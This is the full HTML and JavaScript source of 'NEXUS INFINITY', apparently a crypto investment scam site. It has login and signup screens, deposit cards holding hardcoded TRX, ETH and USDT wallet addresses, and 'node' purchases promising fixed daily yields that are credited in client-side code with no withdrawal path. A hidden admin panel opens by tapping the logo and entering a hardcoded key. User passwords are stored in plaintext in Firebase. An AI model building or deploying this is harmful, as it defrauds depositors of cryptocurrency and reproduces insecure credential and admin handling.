<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        :root { --n-pink: #ff00ff; --n-blue: #00d4ff; --bg: #0b0d11; }
        body { background: var(--bg); color: #f1f5f9; font-family: 'Plus Jakarta Sans', sans-serif; margin: 0; overflow-x: hidden; }
        
        .glass { background: rgba(255, 255, 255, 0.04); backdrop-filter: blur(40px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 30px; }
        .btn-master { background: linear-gradient(135deg, #ff00ff, #00d4ff); font-weight: 800; padding: 18px; border-radius: 20px; transition: 0.3s; text-transform: uppercase; width: 100%; box-shadow: 0 10px 25px rgba(255, 0, 255, 0.2); }
        .input-hub { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.07); border-radius: 18px; padding: 16px; color: white; width: 100%; outline: none; }
        .input-hub:focus { border-color: var(--n-pink); background: rgba(255, 255, 255, 0.06); }
        
        .nav-item { color: #64748b; transition: 0.3s; text-align: center; flex: 1; cursor: pointer; }
        .nav-active { color: #fff; transform: translateY(-3px); }
        .nav-active i { color: var(--n-pink); filter: drop-shadow(0 0 8px var(--n-pink)); }
        
        .broadcast-bar { background: rgba(0, 0, 0, 0.6); border-bottom: 1px solid rgba(255, 255, 255, 0.05); height: 35px; display: flex; align-items: center; position: fixed; top: 0; width: 100%; z-index: 100; overflow: hidden; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .broadcast-text { white-space: nowrap; animation: marquee 20s linear infinite; font-size: 10px; font-weight: 800; text-transform: uppercase; color: var(--n-blue); letter-spacing: 2px; }
        
        .method-card { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 15px; transition: 0.3s; cursor: pointer; }
        .method-card:hover { border-color: var(--n-blue); background: rgba(255, 255, 255, 0.06); }
        .method-active { border-color: var(--n-pink) !important; background: rgba(255, 0, 255, 0.05) !important; }

        .hidden { display: none !important; }
    </style>
</head>
<body>

    <div class="broadcast-bar">
        <div id="broadcast-msg" class="broadcast-text italic">NEXUS INFINITY SECURE NETWORK: MULTI-CHAIN DEPOSITS ENABLED... SYSTEM OPTIMIZED... WELCOME TO THE FUTURE OF ASSET MANAGEMENT.</div>
    </div>

    <div id="splash" class="fixed inset-0 bg-[#0b0d11] z-[9999] flex flex-col items-center justify-center text-center">
        <div class="w-24 h-24 bg-gradient-to-tr from-pink-600 to-blue-600 rounded-[2.5rem] flex items-center justify-center text-5xl font-black italic shadow-[0_0_60px_rgba(255,0,255,0.2)] animate-pulse">N</div>
        <h1 style="font-family: 'Syncopate'" class="mt-8 text-[10px] tracking-[0.8em] text-white/40">GLOBAL INSTITUTIONAL</h1>
    </div>

    <div id="auth-section" class="min-h-screen flex items-center justify-center p-8 pt-16 hidden">
        <div class="max-w-md w-full glass p-10 space-y-8 relative overflow-hidden">
            <div class="absolute -top-20 -left-20 w-40 h-40 bg-pink-500/10 blur-[80px] rounded-full"></div>
            
            <div id="login-ui" class="space-y-6">
                <div class="text-center">
                    <h2 class="text-3xl font-black italic tracking-tighter uppercase">Welcome <span class="text-pink-500 text-lg block tracking-[5px]">TO NEXUS INFINITY</span></h2>
                    <p class="text-[10px] text-zinc-500 font-bold uppercase mt-4 leading-relaxed">Secure Multi-Chain Access Terminal.<br>Please authorize your protocol ID to continue.</p>
                </div>
                <div class="space-y-4">
                    <input type="text" id="l-user" placeholder="Protocol ID / Username" class="input-hub">
                    <input type="password" id="l-pass" placeholder="Security Access Key" class="input-hub">
                    <button onclick="handleLogin()" class="btn-master">Authorize Access</button>
                    <div class="flex items-center gap-4 py-2"><div class="h-[1px] bg-white/10 flex-1"></div><span class="text-[9px] font-black text-zinc-600">OR</span><div class="h-[1px] bg-white/10 flex-1"></div></div>
                    <p onclick="toggleAuth(true)" class="text-center text-[10px] text-blue-400 font-black uppercase cursor-pointer hover:text-white transition">Initialize New Institutional Account</p>
                </div>
            </div>

            <div id="signup-ui" class="space-y-6 hidden">
                <div class="text-center">
                    <h2 class="text-3xl font-black italic tracking-tighter uppercase">Registration <span class="text-pink-500 text-lg block tracking-[5px]">PROTOCOL 1.0</span></h2>
                    <p class="text-[10px] text-zinc-500 font-bold uppercase mt-4">Join the global elite infrastructure network.</p>
                </div>
                <div class="space-y-4">
                    <input type="text" id="s-user" placeholder="Create Unique Username" class="input-hub">
                    <input type="password" id="s-pass" placeholder="Create Secure Password" class="input-hub">
                    <input type="text" id="s-ref" placeholder="Referral Protocol Code" class="input-hub">
                    <button onclick="handleSignup()" class="btn-master">Activate Identity</button>
                    <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer hover:text-white">Already have an ID? Login</p>
                </div>
            </div>
        </div>
    </div>

    <div id="dashboard" class="hidden pb-32 pt-14">
        <header class="p-6 flex justify-between items-center sticky top-8 bg-[#0b0d11]/80 backdrop-blur-2xl z-50 border-b border-white/5">
            <div class="flex items-center gap-4">
                <div id="admin-trigger" class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center font-black border border-white/10 italic text-xl text-pink-500">N</div>
                <div><p id="nav-user" class="text-sm font-black uppercase text-white">...</p><p class="text-[8px] text-green-500 font-black uppercase tracking-widest">● System Verified</p></div>
            </div>
            <div class="flex items-center gap-5">
                <a href="https://t.me/NexusUpdates" target="_blank" class="text-blue-400 text-2xl"><i class="fa-brands fa-telegram"></i></a>
                <button onclick="logout()" class="text-zinc-600 hover:text-red-500"><i class="fa-solid fa-power-off text-xl"></i></button>
            </div>
        </header>

        <main id="page-home" class="p-6 space-y-6">
            <div class="glass p-10 bg-gradient-to-br from-indigo-500/10 to-transparent">
                <p class="text-[9px] font-black text-zinc-500 uppercase tracking-[3px] mb-2">Total Managed Assets</p>
                <h2 id="balance-txt" class="text-5xl font-black italic tracking-tighter">$0.00</h2>
                <div class="mt-10 flex justify-between items-end border-t border-white/10 pt-6">
                    <div><p class="text-[8px] text-zinc-500 uppercase font-black mb-1">Total Yield</p><p id="profit-txt" class="text-xl font-black text-pink-500">+$0.00</p></div>
                    <div class="text-right"><p class="text-[8px] text-zinc-500 uppercase font-black mb-1">Affiliate ID</p><p id="my-ref" class="text-xs font-black text-blue-400 uppercase">...</p></div>
                </div>
            </div>
            <div id="active-nodes-list" class="grid gap-4"></div>
        </main>

        <main id="page-market" class="p-6 space-y-6 hidden">
            <h3 class="text-xl font-black italic uppercase text-pink-500">Node Marketplace</h3>
            <div id="market-list" class="grid gap-4"></div>
        </main>

        <main id="page-vault" class="p-6 space-y-8 hidden">
            <div class="glass p-8 space-y-8">
                <h3 class="text-lg font-black uppercase text-pink-500 italic">Select Asset Injection</h3>
                
                <div class="grid gap-4">
                    <div onclick="selectMethod('TRX', 'TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76')" class="method-card" id="m-trx">
                        <div class="flex justify-between items-center">
                            <div class="flex items-center gap-3"><i class="fa-solid fa-gem text-blue-400"></i><span class="text-xs font-black">TRX Trust Wallet</span></div>
                            <span class="text-[7px] bg-blue-500/10 px-2 py-1 rounded text-blue-400 uppercase">Fastest</span>
                        </div>
                        <p class="text-[9px] text-zinc-500 mt-2 break-all font-mono">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                    </div>
                    <div onclick="selectMethod('ETH', '0xD9359EADE5F5bACA51fb7da043767Bc0685bC355')" class="method-card" id="m-eth">
                        <div class="flex justify-between items-center">
                            <div class="flex items-center gap-3"><i class="fa-brands fa-ethereum text-indigo-400"></i><span class="text-xs font-black">Metamask ETH</span></div>
                        </div>
                        <p class="text-[9px] text-zinc-500 mt-2 break-all font-mono">0xD9359EADE5F5bACA51fb7da043767Bc0685bC355</p>
                    </div>
                    <div onclick="selectMethod('USDT', 'TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ')" class="method-card" id="m-usdt">
                        <div class="flex justify-between items-center">
                            <div class="flex items-center gap-3"><i class="fa-solid fa-circle-dollar-to-slot text-green-400"></i><span class="text-xs font-black">USDT Binance (TRC20)</span></div>
                        </div>
                        <p class="text-[9px] text-zinc-500 mt-2 break-all font-mono">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</p>
                    </div>
                </div>

                <div class="space-y-4 pt-4 border-t border-white/5">
                    <p id="selected-method-info" class="text-[9px] font-black text-center text-zinc-400 uppercase italic">Select a method above to get started</p>
                    <input type="number" id="dep-amt" placeholder="Amount ($)" class="input-hub">
                    <input type="text" id="dep-tid" placeholder="Transaction Hash (TID)" class="input-hub">
                    <label class="block text-[8px] font-black uppercase text-zinc-500 mb-[-10px] ml-2">Upload Transfer Proof</label>
                    <input type="file" id="dep-proof" accept="image/*" class="text-[10px] file:bg-zinc-800 file:border-0 file:rounded-full file:px-4 file:py-2">
                    <img id="preview-img" class="w-full h-44 object-cover rounded-3xl hidden border-2 border-white/10">
                    <button onclick="submitDep()" class="btn-master">Confirm Injection</button>
                </div>
            </div>
        </main>

        <main id="page-logs" class="p-6 space-y-6 hidden">
            <div class="flex justify-between items-center">
                <h3 class="text-lg font-black uppercase italic">Protocol Logs</h3>
                <button onclick="clearMyHistory()" class="text-[9px] text-red-500 font-black uppercase bg-red-500/10 px-4 py-2 rounded-full">Purge Data</button>
            </div>
            <div id="history-list" class="grid gap-3"></div>
        </main>

        <nav class="fixed bottom-0 left-0 right-0 p-6 bg-[#0b0d11]/95 backdrop-blur-3xl border-t border-white/5 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item nav-active"><i class="fa-solid fa-microchip text-xl"></i><p class="text-[8px] font-black uppercase mt-1">Core</p></div>
            <div onclick="switchPage('market')" class="nav-item"><i class="fa-solid fa-server text-xl"></i><p class="text-[8px] font-black uppercase mt-1">Nodes</p></div>
            <div onclick="switchPage('vault')" class="nav-item"><i class="fa-solid fa-plus-circle text-xl"></i><p class="text-[8px] font-black uppercase mt-1">Deposit</p></div>
            <div onclick="switchPage('logs')" class="nav-item"><i class="fa-solid fa-receipt text-xl"></i><p class="text-[8px] font-black uppercase mt-1">Logs</p></div>
        </nav>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#0b0d11] z-[10000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10 border-b border-white/10 pb-6">
            <h2 class="text-2xl font-black italic text-pink-500">MASTER TERMINAL</h2>
            <button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button>
        </div>
        <div class="space-y-8">
            <div class="glass p-8 space-y-4">
                <h4 class="text-xs font-black uppercase text-zinc-500 tracking-widest">Global Broadcast Sync</h4>
                <input type="text" id="adm-broadcast" placeholder="Enter Global Message..." class="input-hub">
                <button onclick="updateBroadcast()" class="btn-master !py-3">Distribute Message</button>
            </div>
            <div id="admin-requests" class="space-y-6"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = { apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0", authDomain: "live-54fb4.firebaseapp.com", databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com", projectId: "live-54fb4", storageBucket: "live-54fb4.firebasestorage.app", messagingSenderId: "781910562842", appId: "1:781910562842:web:07a887f860d30fd17d99a3" };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        const marketNodes = Array.from({length: 22}, (_, i) => ({
            id: i+1, title: i < 11 ? `Quantum S-${i+1}` : `Apex Elite X-${i-10}`, price: i < 11 ? (i+1)*20 : (i-10)*500, daily: i < 11 ? (i+1)*2.5 : (i-10)*80, days: i < 11 ? 30 : 60, img: `https://picsum.photos/seed/n${i}/400/200`
        }));

        let activeMethod = ''; window.selectMethod = (type, addr) => {
            document.querySelectorAll('.method-card').forEach(c => c.classList.remove('method-active'));
            document.getElementById('m-'+type.toLowerCase()).classList.add('method-active');
            activeMethod = type; navigator.clipboard.writeText(addr);
            document.getElementById('selected-method-info').innerText = `${type} ADDRESS COPIED TO CLIPBOARD`;
        };

        window.onload = () => {
            renderMarket();
            onValue(ref(db, 'system/broadcast'), (s) => { if(s.val()) document.getElementById('broadcast-msg').innerText = s.val(); });
            setTimeout(() => { document.getElementById('splash').style.display = 'none'; const u = localStorage.getItem('nexus_user'); if(u) showDashboard(u); else document.getElementById('auth-section').classList.remove('hidden'); }, 2500);
        };

        function renderMarket() {
            document.getElementById('market-list').innerHTML = marketNodes.map(n => `
                <div class="glass overflow-hidden">
                    <img src="${n.img}" class="w-full h-32 object-cover opacity-50">
                    <div class="p-6 flex justify-between items-center">
                        <div><h4 class="font-black italic uppercase text-xs">${n.title}</h4><p class="text-[10px] font-bold text-green-400 mt-1">$${n.daily.toFixed(2)} / 24H</p></div>
                        <div class="text-right"><p class="text-xl font-black text-white">$${n.price}</p><button onclick="buyNode(${n.id})" class="mt-2 bg-white text-black px-5 py-1.5 rounded-xl text-[9px] font-black uppercase">Inject Asset</button></div>
                    </div>
                </div>`).join('');
        }

        window.buyNode = async (id) => {
            const user = localStorage.getItem('nexus_user'), node = marketNodes.find(x => x.id === id), s = await get(ref(db, `users/${user}`));
            if((s.val().balance || 0) < node.price) return alert("System Error: Inadequate Funds.");
            const now = Date.now();
            await update(ref(db, `users/${user}`), { balance: s.val().balance - node.price });
            await set(push(ref(db, `users/${user}/nodes`)), { ...node, startTime: now, expires: now + (node.days * 86400000), lastClaim: now });
            alert("Infrastructure Successfully Deployed!"); switchPage('home');
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            document.getElementById('my-ref').innerText = uid;

            onValue(ref(db, `users/${uid}`), (snap) => {
                const d = snap.val(); if(!d) return;
                document.getElementById('balance-txt').innerText = '$' + (d.balance || 0).toFixed(2);
                document.getElementById('profit-txt').innerText = '+$' + (d.profit || 0).toFixed(2);
                
                const history = d.history ? Object.values(d.history).reverse() : [];
                document.getElementById('history-list').innerHTML = history.map(h => `
                    <div class="glass p-5 border-l-4 ${h.status === 'Approved' ? 'border-green-500' : 'border-pink-500'} flex justify-between items-center">
                        <div><p class="text-[9px] font-black uppercase text-zinc-400">${h.type} via ${h.method || 'System'}</p><p class="text-[8px] text-zinc-600">${h.date}</p></div>
                        <div class="text-right"><p class="text-xs font-black italic">$${h.amount}</p><p class="text-[8px] font-black uppercase ${h.status === 'Approved' ? 'text-green-500' : 'text-pink-500'}">${h.status}</p></div>
                    </div>`).join('') || '<p class="text-center opacity-20 py-20 uppercase font-black text-[10px]">Vault Logs Empty</p>';

                const activeNodes = d.nodes ? Object.entries(d.nodes) : [];
                document.getElementById('active-nodes-list').innerHTML = activeNodes.map(([k, n]) => {
                    const rem = Math.max(0, n.expires - Date.now()), hours = Math.floor(rem / 3600000);
                    if(Date.now() - n.lastClaim >= 86400000) {
                        update(ref(db, `users/${uid}`), { profit: (d.profit || 0) + n.daily });
                        update(ref(db, `users/${uid}/nodes/${k}`), { lastClaim: Date.now() });
                    }
                    return `<div class="glass p-6 border-l-4 border-blue-500 flex justify-between items-center">
                        <div><p class="text-[10px] font-black uppercase">${n.title}</p><p class="text-[9px] font-bold text-zinc-500">Yield: $${n.daily.toFixed(2)}</p></div>
                        <div class="text-right"><p class="text-[8px] font-black text-blue-400 animate-pulse uppercase tracking-widest">Running</p><p class="text-[7px] text-zinc-600 mt-1">${hours}H Remaining</p></div>
                    </div>`;
                }).join('') || '<p class="text-center opacity-20 py-10 uppercase font-black text-[10px]">No Active Infrastructure</p>';
            });
        }

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user'), amt = document.getElementById('dep-amt').value, tid = document.getElementById('dep-tid').value, proof = document.getElementById('preview-img').src;
            if(!amt || !tid || !proof || !activeMethod) return alert("Security Validation Failed: Missing Protocol Data.");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, proof, method: activeMethod, status: 'Pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry); await set(ref(db, 'admin/requests/' + hRef.key), entry);
            alert("Deposit Request Transmitted to Audit Team.");
        };

        window.manage = async (id, user, amt, hKey, action) => {
            if(action === 'approve') {
                const s = await get(ref(db, `users/${user}`));
                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
                await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Approved' });
            } else { await update(ref(db, `users/${user}/history/${hKey}`), { status: 'Rejected' }); }
            await remove(ref(db, 'admin/requests/' + id));
        };

        function loadAdmin() {
            onValue(ref(db, 'admin/requests'), (snap) => {
                const d = snap.val();
                document.getElementById('admin-requests').innerHTML = d ? Object.entries(d).map(([id, l]) => `
                    <div class="glass p-6 space-y-4 border border-white/10">
                        <div class="flex justify-between items-center text-[9px] font-black uppercase"><span class="text-pink-500">${l.type} via ${l.method}</span><span class="text-zinc-600">${l.date}</span></div>
                        <p class="text-[10px]">USER: <b class="text-blue-400">${l.user}</b> | AMT: <b class="text-green-500">$${l.amount}</b></p>
                        <p class="text-[9px] text-zinc-500 break-all uppercase">TID: <b>${l.tid || 'N/A'}</b></p>
                        ${l.proof ? `<img src="${l.proof}" class="w-full h-56 object-cover rounded-3xl border border-white/5" onclick="window.open(this.src)">` : ''}
                        <div class="grid grid-cols-2 gap-4"><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','approve')" class="bg-green-600/20 text-green-500 py-4 rounded-2xl text-[10px] font-black uppercase">Approve</button><button onclick="manage('${id}','${l.user}',${l.amount},'${l.hKey}','reject')" class="bg-red-600/20 text-red-500 py-4 rounded-2xl text-[10px] font-black uppercase">Deny</button></div>
                    </div>`).join('') : '<p class="text-center opacity-30 py-20 font-black text-[10px] uppercase">All Protocols Clear</p>';
            });
        }

        document.getElementById('dep-proof').onchange = (e) => { const r = new FileReader(); r.readAsDataURL(e.target.files[0]); r.onload = () => { document.getElementById('preview-img').src = r.result; document.getElementById('preview-img').classList.remove('hidden'); }; };
        let taps = 0; document.getElementById('admin-trigger').onclick = () => { taps++; if(taps === 4) { if(prompt("Security Key:") === "coin786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); } taps = 0; } };
        window.switchPage = (p) => { ['home','market','vault','logs'].forEach(x => document.getElementById('page-'+x).classList.add('hidden')); document.getElementById('page-'+p).classList.remove('hidden'); document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('nav-active')); event.currentTarget.classList.add('nav-active'); };
        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value.trim(), s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); showDashboard(u); } else alert("Access Denied: Invalid Credentials."); };
        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value.trim(), r = document.getElementById('s-ref').value.trim(); await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0, referredBy: r }); alert("Institutional Identity Activated."); toggleAuth(false); };
        window.toggleAuth = (s) => { document.getElementById('login-ui').classList.toggle('hidden', s); document.getElementById('signup-ui').classList.toggle('hidden', !s); };
        window.logout = () => { localStorage.clear(); location.reload(); };
        window.updateBroadcast = async () => { await set(ref(db, 'system/broadcast'), document.getElementById('adm-broadcast').value); alert("Broadcast Synced."); };
        window.clearMyHistory = async () => { if(confirm("Permanently purge vault logs?")) await remove(ref(db, `users/${localStorage.getItem('nexus_user')}/history`)); };
    </script>
</body>
</html>
